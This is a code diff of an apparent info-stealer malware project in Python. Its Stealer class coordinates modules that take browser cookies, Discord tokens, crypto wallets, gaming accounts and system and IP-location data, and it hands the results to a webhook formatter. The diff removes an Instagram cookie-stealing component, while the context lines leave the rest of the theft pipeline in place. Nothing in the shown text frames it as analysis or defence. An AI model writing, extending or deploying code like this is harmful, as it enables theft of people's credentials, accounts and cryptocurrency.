@@ -11,7 +11,6 @@ from .discord import DiscordStealer
 from .system import SystemInfo
 from .wallets import WalletStealer
 from .gaming import GamingStealer
-from .social import SocialStealer
 from .kiwi import KiwiStealer
 from .webhook import WebhookFormatter
 
@@ -24,7 +23,6 @@ class Stealer:
         self.system_info = SystemInfo()
         self.wallet_stealer = WalletStealer()
         self.gaming_stealer = GamingStealer()
-        self.social_stealer = SocialStealer()
         self.kiwi_stealer = KiwiStealer()
         self.formatter = WebhookFormatter(webhook_url)
         self.telegram_data = None
@@ -57,8 +55,6 @@ class Stealer:
             ip, country, city, isp, org, asn, region, zip_code, lat, lon = utils.get_ip_geo()
             geo_info = (ip, country, city, isp, org, asn, region, zip_code, lat, lon)
 
-            self.gather_social(self.browser_stealer.cookies)
-
             if self.browser_stealer.cookies:
                 self.discord_stealer.steal_from_browser_cookies(self.browser_stealer.cookies)
 
@@ -78,7 +74,6 @@ class Stealer:
                 browser_stealer=self.browser_stealer,
                 discord_info=self.discord_stealer.token_info,
                 roblox_data=self.gaming_stealer.roblox,
-                instagram_data=self.social_stealer.instagram,
                 steam_data=self.gaming_stealer.steam,
                 mc_data=self.gaming_stealer.minecraft,
                 wallet_stealer=self.wallet_stealer,
@@ -154,9 +149,4 @@ class Stealer:
         except:
             pass
 
-    def gather_social(self, cookies_data):
-        try:
-            if cookies_data:
-                self.social_stealer.steal_all(cookies_data)
-        except:
-            pass
+
